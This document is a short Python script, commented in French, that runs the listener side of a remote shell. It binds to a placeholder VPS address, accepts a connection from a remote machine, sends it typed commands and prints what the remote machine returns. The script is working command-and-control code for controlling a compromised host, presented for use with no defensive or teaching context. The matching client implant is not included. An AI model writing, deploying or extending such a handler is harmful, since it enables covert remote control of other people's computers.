import socket
import os
import keyboard # Module a installer

def get_user_and_computer_names():
    nom_user = os.getlogin() if os.name == 'posix' else os.environ.get('USERNAME') or "Admin"
    nom_pc = socket.gethostname()

    return nom_user, nom_pc

def set_text_rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m"

def prompt():
    nom_user, nom_pc = get_user_and_computer_names()
    
    
    base_color1 = set_text_rgb(104, 135, 137) + "┍━━━━ ("
    base_color2 = set_text_rgb(104, 135, 137) + ") ━ ["
    base_color3 = set_text_rgb(104, 135, 137) + "]\n┕━$ "
    tilte_color = set_text_rgb(255, 255, 255) + "~"
    user_color = set_text_rgb(58, 113, 196) + f"{nom_user}@{nom_pc}"
    print(base_color1 + user_color + base_color2 + tilte_color + base_color3 + "\033[0m", end="")
    return input(" ")

def start_server():
    HOST = 'IP DU VPS'
    PORT = 13037 # Vous pouvez changer le port

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()

        print(f'Le serveur écoute sur {HOST}:{PORT}')
        ctrl_pressed = False

        while True:
            conn, addr = s.accept()
            with conn:
                print(f'Connecté par {addr}')

                while True:
                    if keyboard.is_pressed('ctrl'):
                        ctrl_pressed = True
                    else:
                        if ctrl_pressed:
                            print("CTRL+X détecté. Fermeture du programme.")
                            return

                    command = prompt().strip()

                    if not command:
                        continue

                    conn.sendall(command.encode("utf-8"))

                    try:
                        output = conn.recv(4096).decode("utf-8")
                        if output:
                            print(f'Sortie de la commande :\n{output}')
                        else:
                            print('Aucune sortie ou client déconnecté.')
                    except:
                        print('Erreur lors de la réception de la sortie du client.')

if __name__ == "__main__":
    start_server()
